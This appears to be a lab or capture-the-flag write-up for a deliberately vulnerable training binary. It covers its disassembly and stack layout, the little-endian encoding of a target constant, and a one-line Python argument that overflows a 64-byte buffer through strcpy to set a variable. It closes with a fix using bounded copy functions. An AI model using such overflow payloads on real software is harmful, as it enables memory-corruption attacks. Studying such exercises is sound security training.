# ex01 — Overflow via `strcpy(argv[1])` to an exact value

Goal: `you have correctly got the variable to the right value`

## Assembly (main)

```
sub    esp, 0x60
cmp    [ebp+0x8], 0x1        ; if argc == 1: errx("need arg")
mov    [esp+0x5c], 0          ; modified = 0
mov    eax, [ebp+0xc]         ; argv
mov    eax, [eax+4]           ; argv[1]
mov    [esp+4], eax
lea    eax, [esp+0x1c]        ; &buffer
call   strcpy                 ; VULN
mov    eax, [esp+0x5c]        ; modified
cmp    eax, 0x61626364
jne    .lose                  ; else: print win
```

## Stack layout

```
+---------------+ esp+0x5c  modified  (target = 0x61626364)
| buffer[64]    | esp+0x1c
+---------------+ esp
```

Same 64-byte gap as ex00 (`0x5c - 0x1c`).

## Constant

`0x61626364` = ASCII `"abcd"` big-endian, so in **little-endian memory**
the bytes are `64 63 62 61` = `"dcba"`.

## Exploit

```bash
./ex01/bin "$(python3 -c "print('A'*64 + 'dcba', end='')")"
```

`strcpy` copies until NUL, so `end=''` avoids appending a newline. Argv strings
never contain NUL, so all 68 bytes make it in.

Output: `you have correctly got the variable to the right value`

## Fix

`strcpy(dst, src)` has no bound. Use `strncpy(dst, src, sizeof(dst)-1)` and
NUL-terminate, or `snprintf`, or better `strlcpy`/`strscpy`.
